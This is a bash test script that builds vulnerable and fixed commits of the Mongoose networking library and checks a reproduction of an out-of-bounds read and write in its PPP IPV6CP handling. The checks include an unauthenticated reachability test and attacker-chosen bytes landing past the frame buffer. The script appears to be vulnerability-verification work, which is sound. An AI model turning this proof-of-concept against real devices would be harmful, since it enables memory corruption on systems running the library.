#!/bin/bash
# CVE-2026-63626 / GHSA-pc66-j6r6-49x9 — REAL-STACK experiment.
#
# Builds the byte-exact pinned vulnerable parent (8bb65c64926d) and the
# upstream fixed commit (751f14742dea) from the provisioned worktrees, drives
# the real mg_tcpip_if ingress path (mg_tcpip_qwrite -> mg_mgr_poll ->
# mg_tcpip_rx -> mg_l2_rx -> mg_l2_ppp_rx -> ppp_rx -> ppp_handle_ipv6cp),
# and asserts rungs 1-4 plus the fixed and safe controls. Loopback-only:
# no socket, no listener, no external probe, no off-loopback traffic.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E/raw"
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
  if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
  if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}

V=mongoose
F=mongoose-fixed
VHEAD=8bb65c64926d81e55a2e5c90619c034123d60e94
FHEAD=751f14742dea934bec08a507ab1fecc3673d4903

# --- provision the two byte-exact pinned trees if absent (fetching sources is
# provisioning, allowed; no probe ever leaves this process) -----------------
if [ ! -f "$V/mongoose.c" ]; then
  git clone --quiet --no-checkout https://github.com/cesanta/mongoose.git "$V" \
    || exit 98
  git -C "$V" checkout --quiet "$VHEAD" || exit 98
fi
if [ ! -f "$F/mongoose.c" ]; then
  git -C "$V" worktree add --quiet --detach "$PWD/$F" "$FHEAD" || exit 98
fi

# --- pinned worktrees must be present at the exact commits -----------------
[ "$(git -C "$V" rev-parse HEAD 2>/dev/null)" = "$VHEAD" ] \
  && ok "vuln-worktree-at-pinned-parent" || no "vuln-worktree-at-pinned-parent"
[ "$(git -C "$F" rev-parse HEAD 2>/dev/null)" = "$FHEAD" ] \
  && ok "fixed-worktree-at-upstream-fix" || no "fixed-worktree-at-upstream-fix"
has "$F/src/l2_ppp.c" 'if (len < sizeof(*ipv6cp) || len > ipv6cpsz) return;' \
    "fixed-guard-present-in-real-source"
hasnt "$V/src/l2_ppp.c" 'if (len < sizeof(*ipv6cp) || len > ipv6cpsz) return;' \
    "vuln-guard-absent-in-real-source"

DEFS='-DMG_ENABLE_TCPIP=1 -DMG_ENABLE_IPV6=1 -DMG_ENABLE_TCPIP_DRIVER_INIT=0 -DMG_ENABLE_LINES=1'
SAN='-fsanitize=address -fno-omit-frame-pointer'
cc -O0 -g -std=gnu11 -I "$V" $DEFS -o live-plain live_harness.c "$V/mongoose.c" \
  2> "$E/raw/build-plain.log" && ok "build-plain-vuln" || no "build-plain-vuln"
cc -O0 -g -std=gnu11 $SAN -I "$V" $DEFS -o live-asan live_harness.c "$V/mongoose.c" \
  2> "$E/raw/build-asan.log" && ok "build-asan-vuln" || no "build-asan-vuln"
cc -O0 -g -std=gnu11 -I "$F" $DEFS -o live-plain-fixed live_harness.c "$F/mongoose.c" \
  2> "$E/raw/build-plain-fixed.log" && ok "build-plain-fixed" || no "build-plain-fixed"
cc -O0 -g -std=gnu11 $SAN -I "$F" $DEFS -o live-asan-fixed live_harness.c "$F/mongoose.c" \
  2> "$E/raw/build-asan-fixed.log" && ok "build-asan-fixed" || no "build-asan-fixed"

export ASAN_OPTIONS=detect_leaks=0
run() { ./$1 "$2" > "$E/raw/$1-$2.out" 2>&1; }

# --- rung 1 + real framesize bound ------------------------------------------
run live-plain info
has "$E/raw/live-plain-info.out" 'FRAMESIZE=1504 TX_LEN=1504' 'r1-real-framesize-1504'
has "$E/raw/live-plain-info.out" 'OVERFLOW_65535=64031' 'r1-real-overflow-64031'

# --- reachability: one peer LCP CFG-ACK sets the gate, no auth --------------
run live-plain lcp
has "$E/raw/live-plain-lcp.out" 'LCP_GATE_AFTER=1' 'reach-lcp-gate-set-no-auth'
run live-plain nolcp
has "$E/raw/live-plain-nolcp.out" 'GW_AFTER=0000000000000000' 'reach-gate-required-control'

# --- rung 3a: OOB READ in find_opt on the real source, 20-byte heap frame ---
run live-asan read
has "$E/raw/live-asan-read.out" 'READ of size 1' 'r3a-read-size-1'
has "$E/raw/live-asan-read.out" 'in find_opt' 'r3a-read-in-find-opt'
has "$E/raw/live-asan-read.out" '20-byte region' 'r3a-read-past-20-byte-frame'

# --- rung 3b: OOB WRITE past the real 1504-byte framesize tx.buf ------------
run live-asan write-small
has "$E/raw/live-asan-write-small.out" 'WRITE of size 2000' 'r3b-write-size-2000'
has "$E/raw/live-asan-write-small.out" 'in ppp_tx_frame' 'r3b-write-in-ppp-tx-frame'
has "$E/raw/live-asan-write-small.out" '1504-byte region' 'r3b-write-past-real-framesize'

# --- real-stack-only: memcpy source read past the 8192-byte RX queue -------
run live-asan write
has "$E/raw/live-asan-write.out" 'READ of size 65535' 'r3c-rx-queue-source-read'
has "$E/raw/live-asan-write.out" '8192-byte region' 'r3c-rx-queue-region'

# --- rung 4: chosen bytes land past the real 1504-byte framesize -----------
run live-plain canary
has "$E/raw/live-plain-canary.out" 'CAN0=5a CAN17=3c' 'r4-chosen-bytes-past-framesize'
has "$E/raw/live-plain-canary.out" 'GW=2222222222222222' 'r4-peer-ifcid-accepted'

# --- safe control on the vulnerable build ----------------------------------
run live-plain safe
has "$E/raw/live-plain-safe.out" 'GW_AFTER=2222222222222222' 'safe-vuln-normal-path'
run live-asan safe
hasnt "$E/raw/live-asan-safe.out" 'ERROR: AddressSanitizer' 'safe-vuln-asan-clean'

# --- upstream fixed control: guard rejects before read or write ------------
for m in write write-small read; do
  run live-asan-fixed "$m"
  hasnt "$E/raw/live-asan-fixed-$m.out" 'ERROR: AddressSanitizer' "fixed-asan-clean-$m"
done
run live-plain-fixed write-small
has "$E/raw/live-plain-fixed-write-small.out" 'GW_AFTER=0000000000000000' \
    'fixed-no-peer-ifcid'
run live-plain-fixed canary
has "$E/raw/live-plain-fixed-canary.out" 'CAN0=cc CAN17=cc' 'fixed-canary-intact'

# --- deterministic normalized trace ----------------------------------------
{
  for f in "$E"/raw/live-*.out; do
    printf '=== %s ===\n' "$(basename "$f")"
    sed -E 's/0x[0-9a-f]+/0xADDR/g; s/==[0-9]+==/==PID==/g; s/#[0-9]+ 0xADDR/[FRAME] 0xADDR/g' "$f"
  done
} | grep -vE 'MG_IO_SIZE|Network is down|All connections closed|IPV6CP cfg' \
  > "$E/trace.txt"
TRACE=$(sha256sum "$E/trace.txt" | cut -d' ' -f1)
printf 'TRACE_SHA256=%s\n' "$TRACE"
printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
